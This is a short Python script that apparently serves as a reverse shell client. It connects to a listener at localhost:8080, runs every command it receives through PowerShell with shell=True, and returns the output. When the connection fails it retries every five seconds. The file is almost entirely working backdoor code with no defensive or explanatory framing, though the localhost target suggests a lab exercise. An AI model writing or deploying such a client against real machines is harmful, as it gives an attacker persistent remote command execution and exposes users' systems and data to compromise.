import socket
import time
import signal
import sys
import subprocess

running = True

def signal_handler(sig, frame):
    global running
    print("\n[*] Shutting down...")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def connect():
    global running
    
    while running:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('localhost', 8080))
            print("[*] Connected!")
            
            while running:
                data = client.recv(1024)
                
                if not data:
                    print("[*] Server closed connection")
                    break
                
                command = data.decode()
                
                try:
                    result = subprocess.run(
                        "powershell -Command " + command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    
                    output = result.stdout + result.stderr
                    
                    if not output:
                        output = "[*] Command executed (no output)\n"
                    
                    delimiter = "\n<<<END_OF_OUTPUT>>>\n"
                    full_message = output + delimiter
                    client.sendall(full_message.encode('utf-8'))
                    
                except subprocess.TimeoutExpired:
                    client.sendall(b"[!] Command timed out\n<<<END_OF_OUTPUT>>>\n")
                except Exception as e:
                    error_msg = f"[!] Error: {str(e)}\n<<<END_OF_OUTPUT>>>\n"
                    client.sendall(error_msg.encode('utf-8'))
            
            client.close()
            print("[*] Connection closed")
            
        except ConnectionRefusedError:
            print("[*] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    connect()